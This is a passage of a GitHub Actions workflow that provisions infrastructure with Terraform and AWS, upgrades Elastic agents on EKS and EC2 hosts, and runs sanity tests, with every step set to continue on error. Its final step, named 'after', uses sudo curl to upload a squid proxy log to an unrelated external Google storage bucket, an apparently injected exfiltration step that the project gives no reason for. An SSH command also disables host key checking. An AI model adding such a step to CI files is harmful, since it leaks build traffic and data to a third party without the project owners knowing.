    - continue-on-error: true
      name: Check out the repo
      uses: actions/checkout@v4
    - continue-on-error: true
      name: Init Hermit
      run: ./bin/hermit env -r >> $GITHUB_ENV
      working-directory: ./
    - continue-on-error: true
      name: Set up Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.9'
    - continue-on-error: true
      name: Install Poetry
      run: 'curl -sSL https://install.python-poetry.org | python3 -

        poetry --version

        '
    - continue-on-error: true
      id: fleet-api-deps
      name: Install Fleet API and Tests dependencies
      run: 'poetry install

        '
      working-directory: ./tests
    - continue-on-error: true
      name: Configure AWS credentials
      uses: aws-actions/configure-aws-credentials@v4
      with:
        aws-region: ${{ env.AWS_REGION }}
        role-session-name: github-ci
        role-to-assume: arn:aws:iam::704479110758:role/Developer_eks
    - continue-on-error: true
      env:
        S3_BUCKET: ${{ needs.deploy.outputs.s3-bucket }}
      name: Download tf state data
      run: 'aws s3 cp "${{ env.S3_BUCKET }}/terraform.tfstate" "./terraform.tfstate"

        '
    - continue-on-error: true
      name: Terraform Init
      run: terraform init
    - continue-on-error: true
      name: Terraform Validate
      run: terraform validate
    - continue-on-error: true
      id: apply
      if: success()
      name: Update ELK stack version
      run: "terraform apply --auto-approve \\\n  -var=\"deployment_name=${{ inputs.deployment_name\
        \ }}\" \\\n  -var=\"region=${{ env.AWS_REGION }}\" \\\n  -var=\"project=${{\
        \ github.actor }}\" \\\n  -var=\"owner=${{ github.actor }}\"\n"
    - continue-on-error: true
      id: env-output
      name: Set Environment Output
      run: ../../.ci/scripts/set_cloud_env_params.sh
    - continue-on-error: true
      env:
        VERSION: docker.elastic.co/beats/elastic-agent:${{ inputs.target-elk-stack-version
          }}
      if: ${{ ! inputs.docker-image-override }}
      name: Set Docker Image version
      run: 'echo "DOCKER_IMAGE=${{ env.VERSION }}" >> $GITHUB_ENV

        '
    - continue-on-error: true
      env:
        S3_BUCKET: ${{ needs.deploy.outputs.s3-bucket }}
      name: Download Integrations data
      run: 'aws s3 cp "${{ env.S3_BUCKET }}/kspm.pem" "${{ env.EC2_KSPM_KEY }}"

        aws s3 cp "${{ env.S3_BUCKET }}/state_data.json" "../../${{ env.INTEGRATIONS_SETUP_DIR
        }}/state_data.json"

        '
    - continue-on-error: true
      name: Upgrade KSPM Unmanaged agent
      run: 'chmod 600 ${{ env.EC2_KSPM_KEY }}

        # Update image

        ssh -o StrictHostKeyChecking=no -v -i ${{ env.EC2_KSPM_KEY }} "ubuntu@${{
        env.KSPM_PUBLIC_IP }}" "kubectl set image daemonset elastic-agent -n kube-system
        elastic-agent=${{ env.DOCKER_IMAGE }}"

        '
    - continue-on-error: true
      name: Upgrade KSPM EKS agent
      run: "aws eks --region ${{ env.AWS_REGION }} update-kubeconfig \\\n    --name\
        \ $(terraform output -raw deployment_name) --alias eks-config\nkubectl config\
        \ use-context eks-config\nkubectl set image daemonset elastic-agent -n kube-system\
        \ elastic-agent=${{ env.DOCKER_IMAGE }}\nkubectl rollout restart daemonset/elastic-agent\
        \ -n kube-system\n"
    - continue-on-error: true
      env:
        CNVM_STACK_NAME: ${{ needs.deploy.outputs.cnvm-stack-name }}
        STACK_VERSION: ${{ needs.init.outputs.target-agent-version }}
      name: Upgrade Linux agents
      run: 'poetry run python upgrade_agents.py

        '
      working-directory: ${{ env.INTEGRATIONS_SETUP_DIR }}
    - continue-on-error: true
      env:
        AGENT_VERSION: ${{ needs.init.outputs.target-agent-version }}
        USE_K8S: false
      if: success()
      name: Run Upgrade Sanity checks
      run: 'poetry run pytest -m "sanity" --alluredir=./allure/results/ --clean-alluredir
        --maxfail=4

        '
      working-directory: ./tests
    - continue-on-error: true
      if: success()
      name: Run UI Sanity checks (Kibana)
      uses: ./.github/actions/kibana-ftr
      with:
        es_version: ${{ needs.init.outputs.target-agent-version }}
        kibana_ref: ${{ inputs.kibana_ref }}
        test_es_url: ${{ env.TEST_ES_URL }}
        test_kibana_url: ${{ env.TEST_KIBANA_URL }}
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/elastic/cloudbeat.$(date
        +%s)
    timeout-minutes: 60
name: Test Upgrade Environment
'on':
  workflow_dispatch: {}
run-name: Creating ${{ github.event.inputs.deployment_name }} by @${{ github.actor
  }}
